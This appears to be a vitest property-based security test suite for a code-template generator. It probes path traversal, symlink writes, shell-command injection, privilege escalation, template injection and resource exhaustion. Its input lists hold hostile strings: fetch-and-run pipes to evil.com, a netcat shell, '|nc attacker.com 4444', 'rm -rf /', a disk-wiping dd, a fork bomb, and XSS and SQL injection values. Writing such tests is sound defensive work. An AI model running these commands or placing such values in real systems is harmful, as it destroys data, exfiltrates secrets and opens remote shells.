import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import * as fc from "fast-check";
import fs from "fs-extra";
import path from "node:path";
import os from "node:os";
import { Generator } from "../../../src/lib/generator.js";
import { FileInjector } from "../../../src/lib/file-injector.js";
import { FrontmatterParser } from "../../../src/lib/frontmatter-parser.js";

describe("Security Adversary Tests", () => {
  let tmpDir: string;
  let generator: Generator;
  let fileInjector: FileInjector;
  let frontmatterParser: FrontmatterParser;
  let templatesDir: string;

  beforeEach(async () => {
    // Create isolated test environment
    tmpDir = path.join(os.tmpdir(), `unjucks-security-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    await fs.ensureDir(tmpDir);
    
    templatesDir = path.join(tmpDir, "_templates");
    await fs.ensureDir(templatesDir);
    
    generator = new Generator(templatesDir);
    fileInjector = new FileInjector();
    frontmatterParser = new FrontmatterParser();

    // Mock console to prevent test pollution
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(async () => {
    try {
      await fs.remove(tmpDir);
    } catch {
      // Ignore cleanup errors
    }
    vi.restoreAllMocks();
  });

  describe("Path Traversal Attacks", () => {
    it("should prevent path traversal in template destination paths", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            traversalPath: fc.constantFrom(
              "../../../etc/passwd",
              "../../root/.ssh/id_rsa", 
              "../../../home/user/.bashrc",
              "../../../../windows/system32/hosts",
              "..\\..\\..\\windows\\system32\\hosts",
              "../../../proc/version",
              "../../etc/shadow",
              "../../../var/log/auth.log"
            ),
            content: fc.string({ minLength: 10, maxLength: 100 })
          }),
          async ({ traversalPath, content }) => {
            const maliciousTemplate = `---
to: ${traversalPath}
---
${content}`;

            // Create malicious template
            const genDir = path.join(templatesDir, "malicious");
            const templateDir = path.join(genDir, "traversal");
            await fs.ensureDir(templateDir);
            await fs.writeFile(path.join(templateDir, "evil.txt"), maliciousTemplate, "utf-8");

            try {
              const result = await generator.generate({
                generator: "malicious",
                template: "traversal",
                dest: tmpDir,
                force: false,
                dry: false
              });

              // Property: Should not create files outside tmpDir
              for (const file of result.files) {
                const resolvedPath = path.resolve(file.path);
                const resolvedTmpDir = path.resolve(tmpDir);
                
                // Critical security check: File should be within tmpDir boundaries
                expect(resolvedPath.startsWith(resolvedTmpDir)).toBe(true);
              }

              // Verify no system files were compromised
              const systemPaths = [
                "/etc/passwd",
                "/etc/shadow", 
                "/root/.ssh/id_rsa",
                path.join(os.homedir(), ".bashrc"),
                "C:\\Windows\\System32\\hosts"
              ];

              for (const systemPath of systemPaths) {
                if (await fs.pathExists(systemPath)) {
                  const originalStat = await fs.stat(systemPath);
                  // System files should not have been modified
                  expect(originalStat.mtime).toBeTruthy();
                }
              }

            } catch (error) {
              // Errors are acceptable - system should reject malicious paths
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 15 }
      );
    });

    it("should sanitize relative paths in file injection operations", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousPath: fc.constantFrom(
              "../../../etc/passwd",
              "../../sensitive/data.txt",
              "../../../../../root/secret",
              "..\\..\\..\\windows\\system.ini"
            ),
            content: fc.string({ minLength: 5, maxLength: 50 })
          }),
          async ({ maliciousPath, content }) => {
            // Test file injector directly with malicious paths
            const result = await fileInjector.processFile(
              maliciousPath,
              content,
              {},
              { force: true, dry: false }
            );

            if (result.success) {
              // If operation succeeded, verify file is contained within expected boundaries
              const resolvedPath = path.resolve(maliciousPath);
              const currentDir = path.resolve(process.cwd());
              
              // File should not be created in system directories
              expect(resolvedPath.startsWith("/etc/")).toBe(false);
              expect(resolvedPath.startsWith("/root/")).toBe(false);
              expect(resolvedPath.includes("windows/system")).toBe(false);
              expect(resolvedPath.includes("C:\\Windows")).toBe(false);
            } else {
              // Failure is acceptable and preferred for security
              expect(result.message).toBeDefined();
            }
          }
        ),
        { numRuns: 12 }
      );
    });

    it("should prevent symlink attacks", async () => {
      if (process.platform === "win32") return; // Skip on Windows

      await fc.assert(
        fc.asyncProperty(
          fc.record({
            targetFile: fc.constantFrom("/etc/hosts", "/root/.profile", "/etc/passwd"),
            content: fc.string({ minLength: 10, maxLength: 100 })
          }),
          async ({ targetFile, content }) => {
            const symlinkPath = path.join(tmpDir, "evil-symlink");
            
            try {
              // Create symlink to system file
              await fs.symlink(targetFile, symlinkPath);
              
              // Attempt to write through symlink
              const result = await fileInjector.processFile(
                symlinkPath,
                content,
                {},
                { force: true, dry: false }
              );

              if (result.success) {
                // If write succeeded, verify system file wasn't modified
                if (await fs.pathExists(targetFile)) {
                  const stats = await fs.lstat(symlinkPath);
                  expect(stats.isSymbolicLink()).toBe(true);
                  
                  // System should either reject the write or handle it safely
                  const realPath = await fs.realpath(symlinkPath);
                  expect(realPath).toBe(targetFile);
                  
                  // The actual system file should not contain our test content
                  if (await fs.pathExists(targetFile)) {
                    const systemContent = await fs.readFile(targetFile, "utf-8");
                    expect(systemContent).not.toContain(content);
                  }
                }
              }
            } catch (error) {
              // Errors are expected and preferred for security
              expect(error).toBeDefined();
            } finally {
              try {
                await fs.unlink(symlinkPath);
              } catch {
                // Ignore cleanup errors
              }
            }
          }
        ),
        { numRuns: 8 }
      );
    });
  });

  describe("Command Injection Prevention", () => {
    it("should sanitize shell commands in frontmatter", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousCommand: fc.constantFrom(
              "rm -rf /",
              "cat /etc/passwd",
              "curl malicious.com/steal | sh",
              "wget -O- http://evil.com/backdoor.sh | bash",
              "dd if=/dev/zero of=/dev/sda",
              ":(){ :|:& };:", // Fork bomb
              "sudo rm -rf /",
              "nc -l -p 1234 -e /bin/bash",
              "python -c \"import os; os.system('rm -rf /')\""
            ),
            content: fc.string({ minLength: 5, maxLength: 50 })
          }),
          async ({ maliciousCommand, content }) => {
            const maliciousTemplate = `---
to: safe-file.txt
sh: ${maliciousCommand}
---
${content}`;

            const genDir = path.join(templatesDir, "cmd-injection");
            const templateDir = path.join(genDir, "test");
            await fs.ensureDir(templateDir);
            await fs.writeFile(path.join(templateDir, "test.txt"), maliciousTemplate, "utf-8");

            // Execute with timeout to prevent hanging
            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Command timeout")), 5000)
            );

            try {
              await Promise.race([
                generator.generate({
                  generator: "cmd-injection",
                  template: "test", 
                  dest: tmpDir,
                  force: true,
                  dry: false
                }),
                timeout
              ]);

              // If commands executed, verify system integrity
              expect(await fs.pathExists("/etc/passwd")).toBe(true); // Should still exist
              expect(await fs.pathExists("/")).toBe(true); // Root should exist
              
              // No network connections should be established (hard to test but worth noting)
              
            } catch (error) {
              // Command rejection or timeout is preferred
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 10 }
      );
    });

    it("should prevent privilege escalation attempts", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            escalationCommand: fc.constantFrom(
              "sudo su -",
              "su root",
              "sudo chmod 777 /etc/passwd",
              "sudo usermod -aG sudo user",
              "sudo -i",
              "pkexec /bin/bash"
            )
          }),
          async ({ escalationCommand }) => {
            const template = `---
sh: ${escalationCommand}
---
test content`;

            const parsed = frontmatterParser.parse(template);
            
            // Mock shell execution to verify command sanitization
            const originalExec = fileInjector.executeCommands;
            let executedCommand: string | undefined;
            
            fileInjector.executeCommands = async (commands: string | string[]) => {
              const cmdArray = Array.isArray(commands) ? commands : [commands];
              executedCommand = cmdArray[0];
              
              // Simulate rejection of privileged commands
              if (cmdArray.some(cmd => cmd.includes("sudo") || cmd.includes("su "))) {
                return {
                  success: false,
                  outputs: [],
                  errors: ["Permission denied"]
                };
              }
              
              return { success: true, outputs: [], errors: [] };
            };

            try {
              await fileInjector.executeCommands(escalationCommand);
              
              // Verify command was either blocked or sanitized
              if (executedCommand) {
                expect(executedCommand).toBeDefined();
                // System should handle privilege escalation safely
              }
            } finally {
              fileInjector.executeCommands = originalExec;
            }
          }
        ),
        { numRuns: 8 }
      );
    });
  });

  describe("Resource Exhaustion Prevention", () => {
    it("should handle extremely large file operations safely", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            size: fc.constantFrom(
              100_000_000, // 100MB
              500_000_000, // 500MB
              1_000_000_000 // 1GB
            )
          }),
          async ({ size }) => {
            const hugePath = path.join(tmpDir, "huge-file.txt");
            
            // Create large content
            const chunk = "A".repeat(10000);
            const iterations = Math.floor(size / 10000);
            
            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Operation timeout")), 10000)
            );

            try {
              await Promise.race([
                fs.writeFile(hugePath, chunk.repeat(Math.min(iterations, 10000)), "utf-8"),
                timeout
              ]);

              if (await fs.pathExists(hugePath)) {
                const stats = await fs.stat(hugePath);
                
                // Verify system handles large files appropriately
                expect(stats.size).toBeLessThan(1_000_000_000); // 1GB limit
                
                // Test injection on large file
                const result = await fileInjector.processFile(
                  hugePath,
                  "injected content",
                  { append: true },
                  { force: true, dry: true } // Use dry run for safety
                );
                
                // System should handle or reject gracefully
                expect(typeof result.success).toBe("boolean");
              }

            } catch (error) {
              // Resource limits or timeouts are acceptable
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 5 }
      );
    });

    it("should prevent infinite loops in template processing", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            recursiveTemplate: fc.constantFrom(
              "{% for i in range(999999) %}{{i}}{% endfor %}",
              "{% set x = x + 1 %}{% if x < 999999 %}{% include 'self' %}{% endif %}",
              "{% macro recursive() %}{{recursive()}}{% endmacro %}{{recursive()}}"
            ),
            content: fc.string({ minLength: 5, maxLength: 20 })
          }),
          async ({ recursiveTemplate, content }) => {
            const template = `---
to: output.txt
---
${recursiveTemplate}${content}`;

            const genDir = path.join(templatesDir, "infinite");
            const templateDir = path.join(genDir, "loop");
            await fs.ensureDir(templateDir);
            await fs.writeFile(path.join(templateDir, "loop.txt"), template, "utf-8");

            const timeout = new Promise((_, reject) => 
              setTimeout(() => reject(new Error("Template processing timeout")), 3000)
            );

            try {
              await Promise.race([
                generator.generate({
                  generator: "infinite",
                  template: "loop",
                  dest: tmpDir,
                  force: true,
                  dry: true // Use dry run for safety
                }),
                timeout
              ]);
              
              // If processing completed, it should be within reasonable bounds
              // No assertion needed - non-hanging completion is the test
              
            } catch (error) {
              // Timeout or processing error is expected and preferred
              expect(error.message).toContain("timeout");
            }
          }
        ),
        { numRuns: 6 }
      );
    });
  });

  describe("Input Validation Attacks", () => {
    it("should handle malformed YAML frontmatter safely", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            malformedYaml: fc.constantFrom(
              "to: file.txt\nsh: |\n  rm -rf /\n  format: json\n  nested:\n    evil: true",
              "inject: true\nbefore: ': /etc/passwd'\nafter: null\nundefined: ~",
              "lineAt: '../../etc/hosts'\nchmod: 'invalid'\nsh: [rm, -rf, /]",
              "to: file.txt\n[malicious]\nkey: value\n{evil: true}",
              "to: file.txt\n---\nmalicious: ---\nmore: content\n---"
            )
          }),
          async ({ malformedYaml }) => {
            const template = `---
${malformedYaml}
---
safe content`;

            const result = frontmatterParser.parse(template);
            
            // Property: Parser should handle malformed YAML safely
            expect(result).toBeDefined();
            expect(typeof result.hasValidFrontmatter).toBe("boolean");
            
            if (result.hasValidFrontmatter) {
              // If parsed successfully, validate the configuration
              const validation = frontmatterParser.validate(result.frontmatter);
              
              // Invalid configurations should be caught
              if (!validation.valid) {
                expect(validation.errors.length).toBeGreaterThan(0);
              }
              
              // Verify dangerous values are handled safely
              if (result.frontmatter.to) {
                expect(typeof result.frontmatter.to).toBe("string");
              }
              
              if (result.frontmatter.chmod) {
                // Should be string or number, not arbitrary values
                expect(["string", "number"].includes(typeof result.frontmatter.chmod)).toBe(true);
              }
            } else {
              // Failed parsing is acceptable for malformed input
              expect(result.frontmatter).toEqual({});
            }
          }
        ),
        { numRuns: 12 }
      );
    });

    it("should sanitize template variable injections", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            maliciousVariable: fc.constantFrom(
              "<script>alert('xss')</script>",
              "${process.exit(1)}",
              "{{constructor.constructor('return process')().exit()}}",
              "../../etc/passwd",
              "\"; DROP TABLE users; --",
              "&& rm -rf /",
              "|nc attacker.com 4444",
              "`rm -rf /`",
              "$(curl evil.com/steal-data)"
            ),
            variableName: fc.constantFrom("name", "title", "description", "path")
          }),
          async ({ maliciousVariable, variableName }) => {
            const template = `---
to: {{${variableName}}}.txt
---
Hello {{${variableName}}}!`;

            const genDir = path.join(templatesDir, "injection");
            const templateDir = path.join(genDir, "variable");
            await fs.ensureDir(templateDir);
            await fs.writeFile(path.join(templateDir, "test.txt"), template, "utf-8");

            try {
              const result = await generator.generate({
                generator: "injection",
                template: "variable",
                dest: tmpDir,
                force: true,
                dry: true, // Use dry run for safety
                [variableName]: maliciousVariable
              } as any);

              // Verify variables are processed safely
              for (const file of result.files) {
                // File paths should not contain dangerous characters
                expect(file.path).not.toMatch(/[<>&|`$()]/);
                expect(file.path).not.toContain("..");
                
                // Content should be rendered but not executed
                expect(typeof file.content).toBe("string");
                expect(file.content).not.toMatch(/process\.exit/);
                expect(file.content).not.toMatch(/constructor\.constructor/);
              }

            } catch (error) {
              // Template processing errors are acceptable for malicious input
              expect(error).toBeDefined();
            }
          }
        ),
        { numRuns: 15 }
      );
    });
  });

  describe("File System Security", () => {
    it("should respect file permissions and ownership", async () => {
      if (process.platform === "win32") return; // Skip on Windows

      await fc.assert(
        fc.asyncProperty(
          fc.record({
            chmod: fc.constantFrom("000", "777", "4755", "2755", "1755"),
            content: fc.string({ minLength: 10, maxLength: 100 })
          }),
          async ({ chmod, content }) => {
            const testFile = path.join(tmpDir, "permission-test.txt");
            
            const result = await fileInjector.processFile(
              testFile,
              content,
              { chmod },
              { force: true, dry: false }
            );

            if (result.success) {
              const stats = await fs.stat(testFile);
              const mode = stats.mode & parseInt("777", 8);
              const expectedMode = parseInt(chmod, 8);
              
              // Verify permissions are set correctly (accounting for umask)
              // The system may modify permissions based on umask
              expect(mode & expectedMode).toBeTruthy();
              
              // Verify file is readable/writable as expected
              if (expectedMode & parseInt("200", 8)) { // Owner write
                expect(stats.mode & parseInt("200", 8)).toBeTruthy();
              }
              
              if (expectedMode & parseInt("400", 8)) { // Owner read
                expect(stats.mode & parseInt("400", 8)).toBeTruthy();
              }
              
              // Setuid/setgid bits should be handled carefully
              if (chmod.startsWith("4") || chmod.startsWith("2")) {
                // These are potentially dangerous and should be rejected or handled specially
                expect(result.message).toBeDefined();
              }
            }
          }
        ),
        { numRuns: 10 }
      );
    });

    it("should prevent race conditions in file operations", async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            filename: fc.stringMatching(/^[a-zA-Z][a-zA-Z0-9_.-]*$/),
            content1: fc.string({ minLength: 10, maxLength: 50 }),
            content2: fc.string({ minLength: 10, maxLength: 50 })
          }),
          async ({ filename, content1, content2 }) => {
            const filePath = path.join(tmpDir, filename);
            
            // Simulate concurrent operations
            const promises = [
              fileInjector.processFile(filePath, content1, {}, { force: true, dry: false }),
              fileInjector.processFile(filePath, content2, {}, { force: true, dry: false })
            ];

            const results = await Promise.allSettled(promises);
            
            // At least one operation should succeed
            const successful = results.filter(r => r.status === 'fulfilled' && r.value.success);
            expect(successful.length).toBeGreaterThan(0);
            
            if (await fs.pathExists(filePath)) {
              const finalContent = await fs.readFile(filePath, "utf-8");
              
              // Final content should be one of the expected values (allowing for race conditions)
              const possibleContents = [content1, content2];
              const contentMatches = possibleContents.some(expected => finalContent.includes(expected) || expected.includes(finalContent));
              expect(contentMatches).toBe(true);
              
              // File should not be corrupted (partial writes)
              expect(finalContent.length).toBeGreaterThan(0);
              expect(finalContent).not.toMatch(/\u0000/); // No null bytes
            }
          }
        ),
        { numRuns: 10 }
      );
    });
  });
});